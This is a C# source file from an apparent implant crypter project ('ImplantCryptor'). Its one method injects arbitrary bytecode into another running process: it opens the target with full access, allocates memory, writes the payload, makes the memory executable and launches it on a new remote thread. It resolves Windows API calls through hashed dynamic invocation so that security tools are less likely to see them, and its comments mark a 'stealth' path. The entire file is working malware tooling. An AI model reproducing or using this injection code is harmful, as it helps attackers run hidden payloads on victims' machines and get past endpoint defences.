using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;
using System;

namespace ImplantCryptor
{
  class Helpers
  {

    public static void InjectBytecode(byte[] bytecode, long hashKey, string targetProcessName, bool is86)
    {
      IntPtr address;
      IntPtr hProcess = IntPtr.Zero;
      Process[] targetProcesses = Process.GetProcessesByName(targetProcessName);

      Console.WriteLine("[#] Processes:");
      foreach (Process proc in targetProcesses)
      {
        Console.WriteLine(proc.Id);
      }

      Process targetProcess = targetProcesses[0];
      IntPtr hTargetProcess = IntPtr.Zero;
      Console.WriteLine($"[#] tPID : {targetProcess.Id}");



      ///////////////////////////////////
      //// Get pHandle (OpenProcess) ////
      ///////////////////////////////////
      //////////
      // if (remote == false)
      // {
      // address = DInvoke.GetLibraryAddress("kernel32.dll", Constants.Methods.OpenProcess, hashKey);
      // Interop.OpenProcess openProcess = 
      //   Marshal.GetDelegateForFunctionPointer(address, typeof(Interop.OpenProcess)) as Interop.OpenProcess;
      // hProcess = openProcess(Interop.PROCESS_ACCESS_RIGHTS.PROCESS_ALL_ACCESS,
      //     false, Interop.GetCurrentProcessId());
      // }
      //////////
      hTargetProcess = targetProcess.Handle;

      var clientid = new Interop.CLIENT_ID();
      clientid.UniqueProcess = new IntPtr(targetProcess.Id);
      clientid.UniqueThread = IntPtr.Zero;
      var ObjectAttributes = new Interop.OBJECT_ATTRIBUTES();

      address = DInvoke.GetLibraryAddress("ntdll.dll", 
          Constants.Methods.NtOpenProcess, hashKey);
      Interop.NtOpenProcess ntOpenProcess = 
        Marshal.GetDelegateForFunctionPointer(address, typeof(Interop.NtOpenProcess)) as Interop.NtOpenProcess;
      // TODO: change access mask
      Interop.NtStatus status = ntOpenProcess(ref hProcess, 
          Interop.PROCESS_ACCESS_RIGHTS.PROCESS_ALL_ACCESS, 
          ref ObjectAttributes, ref clientid);
      //////////
      Console.WriteLine($"[#] Handle = {hProcess}");



      ///////////////////
      // Validate arch //
      ///////////////////
      address = DInvoke.GetLibraryAddress("kernel32.dll", 
          Constants.Methods.IsWow64Process, hashKey);
      Interop.IsWow64Process isWow64Process = 
        Marshal.GetDelegateForFunctionPointer(address, typeof(Interop.IsWow64Process)) as Interop.IsWow64Process;
      isWow64Process(hProcess, out is86);
      Console.WriteLine($"[#] is86 = {is86}");
      if (is86 == true)
      {
        // TODO
        Console.WriteLine("[X] target process is 32 bit. Exiting...");
        Environment.Exit(1);
      }




      /////////////////////////////////////
      // Allocate RW VM (VirtualAllocEx) //
      /////////////////////////////////////
      IntPtr baseAddress = IntPtr.Zero;
      ////////// stealth
      // address = DInvoke.GetLibraryAddress("kernel32.dll", Constants.Methods.VirtualAllocEx, hashKey);
      // Interop.VirtualAllocEx virtualAllocEx = 
      //   Marshal.GetDelegateForFunctionPointer(address, typeof(Interop.VirtualAllocEx)) as Interop.VirtualAllocEx;
      // baseAddress = virtualAllocEx(hProcess, IntPtr.Zero, (UInt32) bytecode.Length,
      //     Interop.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Interop.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
      //     Interop.PAGE_PROTECTION_FLAGS.PAGE_READWRITE);
      //////////
      //////////
      IntPtr regionSize = (IntPtr)bytecode.Length;
      address = DInvoke.GetLibraryAddress("ntdll.dll", Constants.Methods.NtAllocateVirtualMemory, hashKey);
      Interop.NtAllocateVirtualMemory ntAllocateVirtualMemory = 
        Marshal.GetDelegateForFunctionPointer(address, typeof(Interop.NtAllocateVirtualMemory)) as Interop.NtAllocateVirtualMemory;

      Interop.NtStatus allocStatus = ntAllocateVirtualMemory(hProcess, ref baseAddress, 
          IntPtr.Zero, ref regionSize, 
          Interop.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Interop.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
          Interop.PAGE_PROTECTION_FLAGS.PAGE_READWRITE);
      //////////

      System.Console.WriteLine($"[#] BASEADDRESS = {baseAddress}");

      // Console.WriteLine("[!] Press Enter to proceed to bytecode write ...");
      // Console.ReadLine();



      ////////////////////////////////
      // Write bytecode into memory //
      ////////////////////////////////
      //////////
      // address = DInvoke.GetLibraryAddress("kernel32.dll", Constants.Methods.WriteProcessMemory, hashKey);
      // Interop.WriteProcessMemory writeProcessMemory = 
      //   Marshal.GetDelegateForFunctionPointer(address, typeof(Interop.WriteProcessMemory)) as Interop.WriteProcessMemory;
      // bool writeProcessMemoryResult = writeProcessMemory(hProcess, baseAddress,
      //     bytecode, (uint)bytecode.Length, out uint numberOfBytesWritten);
      //////////
      //////////
      address = DInvoke.GetLibraryAddress("ntdll.dll", Constants.Methods.NtWriteVirtualMemory, hashKey);
      Interop.NtWriteVirtualMemory ntWriteVirtualMemory = 
        Marshal.GetDelegateForFunctionPointer(address, typeof(Interop.NtWriteVirtualMemory)) as Interop.NtWriteVirtualMemory;
      Interop.NtStatus writeProcessMemoryResult = ntWriteVirtualMemory(hProcess, baseAddress, bytecode, (uint)bytecode.Length, out uint numberOfBytesWritten);
      //////////

      System.Console.WriteLine($"[#] Bytes written status = {Convert.ToString(writeProcessMemoryResult)}");
      System.Console.WriteLine($"[#] Num bytes written = {Convert.ToString(numberOfBytesWritten)}");

      // Console.WriteLine("[!] Press Enter to proceed to VP swap ...");
      // Console.ReadLine();



      /////////////////////////////////////////////////////
      // Flip the memory protections with VirtualProtect //
      /////////////////////////////////////////////////////
      address = DInvoke.GetLibraryAddress("kernel32.dll", Constants.Methods.VirtualProtectEx, hashKey);
      Interop.VirtualProtectEx virtualProtectEx = 
        Marshal.GetDelegateForFunctionPointer(address, typeof(Interop.VirtualProtectEx)) as Interop.VirtualProtectEx;

      Interop.PAGE_PROTECTION_FLAGS lpflOldProtect;
      bool virtualProtectResult = virtualProtectEx(hProcess, baseAddress,
          (UIntPtr) bytecode.Length, Interop.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE, // TODO
          out lpflOldProtect);

      System.Console.WriteLine($"[#] old protect = {lpflOldProtect}");

      // Console.WriteLine("[!] Press Enter to proceed to thread creation ...");
      // Console.ReadLine();



      //////////////////////
      // Creating thread  //
      //////////////////////
      Interop.NtStatus createThreadStatus;
      IntPtr hThread;
      //////////
      List<int> threadList = new List<int>();
      ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess.Id).Threads;
      foreach (ProcessThread thread in threadsBefore)
      {
        threadList.Add(thread.Id);
      }

      address = DInvoke.GetLibraryAddress("ntdll.dll", Constants.Methods.NtCreateThreadEx, hashKey);
      Interop.NtCreateThreadEx ntCreateThreadEx = 
        Marshal.GetDelegateForFunctionPointer(address, typeof(Interop.NtCreateThreadEx)) as Interop.NtCreateThreadEx;
      // TODO handle
      // createThreadStatus = ntCreateThreadEx(out hThread, Interop.ACCESS_MASK.THREAD_ALL_ACCESS, IntPtr.Zero, hProcess, (IntPtr)baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
      createThreadStatus = ntCreateThreadEx(out hThread, Interop.ACCESS_MASK.THREAD_ALL_ACCESS, IntPtr.Zero, hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
      //////////
      Interop.WaitForSingleObject(hThread, Interop.WAIT_PROP.INFINITE); // TODO

      // Console.WriteLine("[!] Press Enter to proceed to thread check ...");
      // Console.ReadLine();



      ////////////
      // CHECKS //
      ////////////            
      // check created thread
      ProcessThreadCollection threads = Process.GetProcessById(targetProcess.Id).Threads;
      foreach (ProcessThread thread in threads)
      {
        if (!threadList.Contains(thread.Id))
        {
          Console.WriteLine($"[#] Start Time: {thread.StartTime}; Thread ID: {thread.Id}; Thread State: {thread.ThreadState}");
        }

      }
    }
  }
}
